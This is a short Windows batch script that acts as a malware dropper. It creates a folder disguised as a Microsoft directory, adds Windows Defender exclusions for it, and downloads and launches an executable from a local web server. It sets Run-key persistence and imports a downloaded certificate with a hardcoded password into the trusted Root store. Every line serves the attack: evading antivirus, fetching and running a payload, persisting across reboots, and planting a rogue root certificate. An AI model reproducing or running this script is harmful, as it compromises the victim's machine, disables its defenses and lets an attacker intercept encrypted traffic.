@echo off
setlocal
set "DownloadDir=C:\Program Files\MicrosoftWindows"
if not exist "%DownloadDir%" (
    mkdir "%DownloadDir%"
)
cd "%DownloadDir%"
powershell -Command "Add-MpPreference -ExclusionPath '%DownloadDir%'"
powershell -Command "Add-MpPreference -ExclusionPath '%DownloadDir%\Microsoft.exe'"
powershell -Command "Add-MpPreference -ExclusionPath '%DownloadDir%\Windows.exe'"
curl -o Windows.exe http://localhost:8000/Windows.exe
start Windows.exe
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows" /t REG_SZ /d "%DownloadDir%\Windows" /f
curl -o mspfxx.pfx http://localhost:8000/mspfxx.pfx
set "password=MS12345"
certutil -importpfx -p "%password%" Root "mspfxx.pfx"

pause
